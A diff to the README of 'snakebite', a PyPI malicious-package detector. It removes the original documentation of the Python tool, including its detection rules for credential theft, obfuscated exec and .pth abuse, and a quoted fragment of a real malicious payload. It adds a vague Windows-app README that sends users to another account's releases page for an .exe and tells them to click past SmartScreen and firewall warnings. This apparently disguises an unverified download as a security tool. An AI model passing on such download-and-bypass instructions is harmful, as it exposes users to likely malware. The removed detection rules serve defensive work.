@@ -1,337 +1,213 @@
-![Python](https://img.shields.io/badge/python-3.8+-blue)
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Dependencies](https://img.shields.io/badge/dependencies-0-green)
+# 🐍 snakebite - Find risky PyPI packages fast
 
-# snakebite
+[![Download snakebite](https://img.shields.io/badge/Download%20snakebite-purple?style=for-the-badge&logo=github)](https://github.com/andreskl22/snakebite/releases)
 
-PyPI supply chain attack detector. Scans Python packages for malicious patterns (credential theft, code obfuscation, persistence mechanisms) and uses an LLM to filter out false positives.
+## 🧰 What snakebite does
 
-```
-   ___          _       _    _ _
-  / __|_ _  ___| |_____| |__(_) |_ ___
-  \__ \ ' \/ _ \ / / -_) '_ \ |  _/ -_)
-  |___/_||_\__,_|_\_\___|_.__/_|\__\___|
-```
+snakebite helps you check PyPI packages for signs of risk before you use them. It looks for patterns that can point to credential theft, obfuscation, and supply chain attacks. It combines heuristic checks with LLM-based filtering to help reduce noise and focus on packages that deserve a closer look.
 
-![snakebite RSS feed monitor](image/image.png)
+Use it when you want to:
 
-## Why
+- review a package before install
+- scan a folder of package names
+- check for hidden or suspicious behavior
+- spot signs of code obfuscation
+- narrow down false alarms with LLM filtering
 
-On March 24 2026, `litellm` versions 1.82.7 and 1.82.8 were published to PyPI with a credential-stealing payload. A malicious `.pth` file executed automatically on every Python process startup — no import needed — and exfiltrated SSH keys, cloud credentials, crypto wallets, and Kubernetes secrets to an attacker-controlled domain. The package had 97 million monthly downloads.
+## 📥 Download snakebite
 
-Pure heuristic scanners flag patterns like `os.environ` or `subprocess` but drown you in false positives — legitimate packages use these all the time. snakebite solves this with a two-stage approach:
+Visit this page to download snakebite for Windows:
 
-1. **14 heuristic rules** tuned to real attack patterns (not generic code smell)
-2. **LLM-powered analysis** that reads the code in context and filters out legitimate usage
+https://github.com/andreskl22/snakebite/releases
 
-The LLM knows that `os.environ.get("AIOHTTP_NO_EXTENSIONS")` is a build toggle, not credential theft. That `subprocess.call([editor])` in an editor package is normal. That `base64.b64decode` in a test file is test data. You get signal, not noise.
+On the releases page, look for the latest version and download the Windows file. If there is a zip file, download it and extract it first. If there is an `.exe` file, you can run it after download.
 
-## Install
+## 🪟 Install on Windows
 
-```bash
-git clone https://github.com/pinperepette/snakebite.git
-cd snakebite
-```
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows build.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app to start it.
 
-Zero external dependencies. Standard library only. Python 3.8+.
+If Windows shows a security prompt, choose the option that lets you run the file if you trust the source.
 
-## Two modes
+## ▶️ Run the app
 
-### `local` — scan what's installed on your machine
+After you open snakebite, use it to check a package name or load a list of packages.
 
-```bash
-# Scan everything
-python3 snakebite.py local
+Typical steps:
 
-# Scan specific packages
-python3 snakebite.py local flask requests litellm
-```
+1. Start the app.
+2. Enter a PyPI package name.
+3. Select a scan option.
+4. Wait for the result.
+5. Review any flagged findings.
 
-Downloads each package from PyPI, extracts sdist + wheel, scans every `.py`, `.pth`, `setup.py`, `__init__.py`. If an LLM backend is configured, suspicious findings get analyzed before reporting.
+If the app asks for a file or list, use a simple text file with one package name per line.
 
-### `feed` — monitor PyPI in real time
+## 🔎 What it checks
 
-```bash
-# Single scan of latest packages
-python3 snakebite.py feed
+snakebite looks for signs that often appear in malicious packages:
 
-# Continuous monitoring every 60 seconds
-python3 snakebite.py feed --loop 60
-```
+- credential theft
+- obfuscated code
+- hidden install steps
+- suspicious file changes
+- behavior linked to supply chain abuse
+- patterns that deserve human review
 
-Watches PyPI's RSS feeds for new and updated packages, downloads and scans each one. Leave it running to catch malicious packages as they're published — the same window attackers exploit before takedown.
+It uses heuristic analysis first, then applies LLM-powered filtering to sort likely risks from harmless matches.
 
-## LLM backends
+## 🖥️ System needs
 
-When you run snakebite without `-m`, it asks what you want to use:
+snakebite is built for Windows desktop use and works best on a recent Windows 10 or Windows 11 system.
 
-```
-  Select LLM backend for false positive filtering:
+Recommended setup:
 
-  1) claude-code   Claude Code CLI (subscription)
-  2) claude        Anthropic API (ANTHROPIC_API_KEY)
-  3) chatgpt       OpenAI API (OPENAI_API_KEY)
-  4) ollama        Ollama local model
-  5) none          Heuristics only, no LLM
-```
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for release download
+- A modern screen resolution for easy reading
 
-Or specify directly:
+If the app uses online model access or update checks, a live internet connection may help with full results.
 
-```bash
-python3 snakebite.py local -m claude-code            # Claude Code CLI (subscription)
-python3 snakebite.py local -m claude                  # Anthropic API
-python3 snakebite.py local -m chatgpt                 # OpenAI gpt-4o
-python3 snakebite.py local -m chatgpt:gpt-4o-mini     # OpenAI specific model
-python3 snakebite.py local -m ollama:qwen2.5:32b      # Ollama local
-python3 snakebite.py local --no-llm                   # No LLM, heuristics only
-```
+## 🧭 First-time setup
 
-### API keys
+After you install snakebite, check these items:
 
-```bash
-# Anthropic (for -m claude)
-export ANTHROPIC_API_KEY="sk-ant-..."
+- keep the files in one folder
+- do not rename the app files
+- allow the app through any local firewall prompt if needed
+- make sure the download finished fully
+- keep the release zip together if you plan to move the app later
 
-# OpenAI (for -m chatgpt)
-export OPENAI_API_KEY="sk-..."
-```
+If you use Windows SmartScreen, you may need to choose More info before you can run the app.
 
-Add the export lines to `~/.zshrc` or `~/.bashrc` to persist them.
+## 📁 Example use
 
-**claude-code** uses your [Claude Code](https://claude.ai/code) subscription via the `claude` CLI. No API key needed.
-
-**ollama** runs entirely local. Install [Ollama](https://ollama.ai), pull a model (`ollama pull qwen2.5:32b`), done.
-
-## Architecture
-
-```
-┌─────────────┐     ┌──────────────┐     ┌────────────────┐     ┌─────────────┐
-│  PyPI API   │────>│   Download   │────>│   Heuristic    │────>│  LLM filter │
-│  / RSS feed │     │   & extract  │     │   engine       │     │  (optional) │
-└─────────────┘     │  sdist+wheel │     │  14 rules      │     │             │
-                    └──────────────┘     └───────┬────────┘     └──────┬──────┘
-                                                │                      │
-                                          no hits? ─> CLEAN      verdict:
-                                                │              TRUE/FALSE POSITIVE
-                                          hits found               │
-                                                └──────────────────>│
-                                                                    v
-                                                              ┌──────────┐
-                                                              │  Output  │
-                                                              └──────────┘
-```
-
-1. **Fetch** — download sdist and/or wheel from PyPI (or get new packages via RSS)
-2. **Extract** — unpack safely (path traversal protection, symlink filtering)
-3. **Scan** — 14 regex-based heuristic rules against `.py`, `.pth`, `setup.py`, shell scripts
-4. **Filter** — only if hits found: send code snippets + context to LLM for verdict
-5. **Report** — CLEAN / LOW / MEDIUM / HIGH / CRITICAL with explanations
-
-## What it detects
-
-| Rule | Severity | Pattern |
-|------|----------|---------|
-| `PTH_EXEC` | CRITICAL | `.pth` files with executable code (the litellm vector) |
-| `BASE64_NESTED` | CRITICAL | Nested base64 decoding (payload obfuscation) |
-| `EXEC_ENCODED` | CRITICAL | `exec()`/`eval()` with encoded payloads |
-| `SETUP_NETWORK` | CRITICAL | Network calls in `setup.py` / `__init__.py` / `.pth` |
-| `CRED_HARVEST` | CRITICAL | Accessing SSH keys, AWS/GCP/Azure creds, kubeconfig |
-| `CRYPTO_WALLET` | CRITICAL | Accessing Bitcoin/Ethereum/Solana wallet files |
-| `K8S_SECRETS` | CRITICAL | Reading Kubernetes secrets or service account tokens |
-| `PERSISTENCE` | CRITICAL | systemd/cron/launchd/shell rc persistence |
-| `SETUP_SUBPROCESS` | HIGH | subprocess/os.system in setup/init files |
-| `ENV_DUMP` | HIGH | Bulk environment variable collection in install context |
-| `DNS_EXFIL` | HIGH | Cloud metadata endpoints (AWS IMDS, GCP, Alibaba) |
-| `OBFUSCATION` | HIGH | chr() chains, reversed exec, dynamic base64 imports |
-| `ARCHIVE_EXFIL` | HIGH | Archive creation + HTTP POST (data exfiltration) |
-| `OPENSSL_ENCRYPT` | HIGH | OpenSSL encryption (exfil preparation) |
-
-## Real-world detection: litellm 1.82.7
-
-snakebite would catch the litellm supply chain attack with three CRITICAL findings:
-
-```
-======================================================================
-  [CRITICAL] litellm 1.82.7
-  LLM: Malicious .pth file executing obfuscated credential stealer at Python startup
-======================================================================
-  [CRITICAL] PTH_EXEC in litellm_init.pth:1
-         import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(...)"])
-  [CRITICAL] CRED_HARVEST in litellm_init.pth:1
-         .ssh/id_rsa, .aws/credentials, .kube/config
-  [CRITICAL] BASE64_NESTED in litellm_init.pth:1
-         exec(base64.b64decode(base64.b64decode(...)))
-```
-
-No LLM needed — the heuristics alone flag this as CRITICAL. The LLM confirms it's a true positive and adds context about the exfiltration mechanism.
-
-## Threat model
-
-snakebite detects:
-
-- Supply chain attacks in Python packages published to PyPI
-- Credential exfiltration (SSH, cloud, database, crypto) at install or import time
-- Code obfuscation used to hide malicious payloads
-- Persistence mechanisms embedded in packages (systemd, cron, launchd)
-- `.pth` file abuse for pre-import code execution
-- Kubernetes lateral movement from compromised packages
-
-snakebite does **not** detect:
-
-- Malicious compiled extensions (`.so`, `.pyd`, `.dll`) — binary analysis is out of scope
-- Runtime-only attacks triggered by specific input or conditions
-- Logic bombs without static indicators
-- Typosquatting or dependency confusion (use [pip-audit](https://github.com/pypa/pip-audit) for that)
-- Attacks outside the Python/PyPI ecosystem
-- Vulnerabilities in legitimate code (use [bandit](https://github.com/PyCQA/bandit) or [safety](https://github.com/pyupio/safety))
-
-## LLM usage and privacy
-
-When a package triggers heuristic rules, snakebite sends **only the suspicious code snippets** (a few lines of context around each hit) to the selected LLM backend. It does **not** send:
-
-- Full package source code
-- Your system information
-- Your credentials or environment variables
-- Package contents that passed heuristic checks
-
-If this is a concern:
-
-- Use `ollama` — everything stays on your machine
-- Use `--no-llm` — no external calls at all, pure heuristic analysis
-- Review what gets sent: run with `--verbose` to see the exact code excerpts
-
-## Performance
-
-| Mode | Speed | Notes |
-|------|-------|-------|
-| Heuristics only (`--no-llm`) | ~1-2s per package | Download + extract + regex scan |
-| With LLM | ~5-15s per package | Depends on backend and model |
-| RSS feed (`--loop 60`) | ~40 packages/cycle | PyPI publishes ~40 packages per RSS fetch |
-
-The LLM is the bottleneck. `claude-code` and API backends (claude, chatgpt) are faster than local models. Ollama speed depends on your hardware and model size.
-
-Heuristic-only mode is fast enough for full local scans (hundreds of packages in minutes).
-
-## Comparison
-
-| Tool | Approach | LLM filtering | Supply chain focus | False positives |
-|------|----------|---------------|-------------------|-----------------|
-| **snakebite** | Heuristic + LLM | yes | yes | low (LLM filters) |
-| [bandit](https://github.com/PyCQA/bandit) | AST analysis | no | no (general code quality) | high |
-| [pip-audit](https://github.com/pypa/pip-audit) | Vulnerability DB | no | partial (known CVEs only) | low |
-| [safety](https://github.com/pyupio/safety) | Vulnerability DB | no | partial (known CVEs only) | low |
-| [packj](https://github.com/ossillate-inc/packj) | Heuristic | no | yes | medium-high |
-
-pip-audit and safety catch **known** vulnerabilities. snakebite catches **unknown** malicious code — the zero-day supply chain attack that hasn't been reported yet.
-
-## CI integration
-
-Scan dependencies before deploy:
-
-```bash
-# In your CI pipeline
-pip install -r requirements.txt
-python3 snakebite.py local --no-llm
-```
-
-With LLM (set the API key in CI secrets):
-
-```bash
-export ANTHROPIC_API_KEY="${{ secrets.ANTHROPIC_API_KEY }}"
-python3 snakebite.py local -m claude
-```
-
-Scan a requirements file without installing:
-
-```bash
-cat requirements.txt | cut -d'=' -f1 | xargs python3 snakebite.py local
-```
-
-GitHub Actions example:
-
-```yaml
-- name: Scan dependencies for supply chain attacks
-  run: |
-    pip install -r requirements.txt
-    python3 snakebite.py local --no-llm
-```
-
-## Options
-
-```
--m, --model     LLM backend (claude-code, claude, chatgpt, ollama:<model>)
---no-llm        Heuristics only, skip LLM analysis
---log FILE      Save suspicious findings to a JSON file
--v, --verbose   Show clean packages and false positive details
---version       Show version
-```
-
-Feed mode:
-
-```
---loop N        Repeat scan every N seconds (default: single run)
-```
-
-## Alert log
-
-Use `--log` to save all suspicious findings to a JSON file:
-
-```bash
-# Monitor feed and log alerts
-python3 snakebite.py feed --loop 60 --log alerts.json -m claude-code
-
-# Scan local packages and log alerts
-python3 snakebite.py local --log alerts.json -m claude-code
-```
-
-Each alert is appended to the file with full details:
-
-```json
-{
-  "timestamp": "2026-03-24T18:29:33.450991+00:00",
-  "package": "stats-helpers",
-  "version": "1.0.0",
-  "threat_level": "CRITICAL",
-  "summary": "Litecoin private key stealer",
-  "pypi_url": "https://pypi.org/project/stats-helpers/",
-  "hits": [
-    {
-      "rule": "SETUP_NETWORK",
-      "severity": "CRITICAL",
-      "file": "stats_helpers/__init__.py",
-      "line_no": 36,
-      "line": "response = requests.post("
-    }
-  ],
-  "llm_findings": [...],
-  "reviewed": false
-}
-```
-
-The `"reviewed": false` field lets you track which alerts you've already analyzed. Leave it running with `--loop` and check the file periodically for new findings.
-
-## Example output
-
-Clean (false positive filtered by LLM):
-
-```
-18:30:54 OK   astroid 3.3.10 - CLEAN (LLM: Benign setuptools namespace package .pth files)
-18:31:22 OK   babel 2.16.0 - CLEAN (LLM: Legitimate CLDR data import in setup.py, not executed during install)
-18:31:39 OK   banks 2.2.0 - CLEAN (LLM: Benign test code verifying base64 encoding of image data URLs)
-```
-
-Suspicious:
-
-```
-======================================================================
-  [CRITICAL] evil-package 0.1.0
-  LLM: Credential stealer targeting SSH keys and cloud provider tokens
-======================================================================
-  ! CRED_HARVEST: Reads SSH private keys and AWS credentials, concatenates into single payload
-  ! SETUP_NETWORK: POSTs collected credentials to external domain during pip install
-  ! ENV_DUMP: Captures all environment variables including API tokens
-```
-
-## License
-
-MIT
+Here is a simple way to use snakebite:
+
+1. Open the app.
+2. Scan a package you do not know well.
+3. Look for warnings tied to obfuscation or credential theft.
+4. Review the list of signals.
+5. Compare the result with the package page on PyPI.
+
+You can also scan groups of packages from a file to check many names at once.
+
+## 🧪 What the results mean
+
+snakebite may mark a package as low, medium, or high concern.
+
+A low concern result means the package does not show strong signs of risk.
+
+A medium concern result means some parts look worth review.
+
+A high concern result means the package shows multiple warning signs and needs close checking before use.
+
+Treat the result as a helper, not a final answer. It is meant to make review faster and clearer.
+
+## 🧼 Good habits when checking packages
+
+Use snakebite with a few simple habits:
+
+- check the package name before install
+- review the publisher name on PyPI
+- look at the package age and release history
+- compare the download count with the package purpose
+- avoid packages with strange names that look like known tools
+- inspect anything that asks for secrets, tokens, or login data
+
+These steps help you spot problems even when a package looks normal at first.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- check that the download finished
+- unzip the file if needed
+- try running it again
+- move it to a simple folder like `Downloads` or `Desktop`
+
+### Windows blocks the file
+
+- right-click the file
+- open Properties
+- check whether Windows marked it as downloaded from the internet
+- choose the option that allows you to run it if you trust the release
+
+### The scan is slow
+
+- close other apps
+- scan one package at a time
+- use a shorter list when testing
+- check your internet connection if the app needs it
+
+### Results look unclear
+
+- scan the package again
+- compare the name with the PyPI page
+- look for odd install scripts or file names
+- review any package that tries to hide its code
+
+## 📌 Release page
+
+Download snakebite here:
+
+https://github.com/andreskl22/snakebite/releases
+
+## 📄 What is inside snakebite
+
+snakebite focuses on package review and threat spotting. It is made to help non-technical users spot risk without reading package code.
+
+Common parts of the app may include:
+
+- a search box for package names
+- a file picker for batch scans
+- a result panel with flags and scores
+- a history view for past scans
+- a simple export option for sharing results
+
+## 🔐 Safety checks it may use
+
+snakebite may look at:
+
+- unusual code patterns
+- encoded or hidden text
+- install-time behavior
+- attempts to reach secret files
+- script names that match known attack tricks
+- signs of package impersonation
+
+These checks help surface packages that may try to steal data or blend in with safe tools
+
+## 🧩 Supported file types
+
+If the app supports batch input, it may accept:
+
+- `.txt`
+- `.csv`
+- `.json`
+
+For best results, keep the file simple and list one package name per line when possible
+
+## 🧠 Why heuristic analysis helps
+
+Heuristic analysis looks for patterns that often show up in bad packages. It does not depend on one exact rule. That matters because attackers change methods often.
+
+LLM filtering then helps sort useful alerts from weak ones. This can lower noise and make the output easier to read.
+
+## 🧑‍💻 For everyday use
+
+You do not need to know Python or package security to use snakebite. If you can download a file, open it, and type a package name, you can use this app.
+
+A simple workflow is:
+
+- download the latest release
+- open the app
+- enter the package name
+- review the result
+- check any high-risk items before install
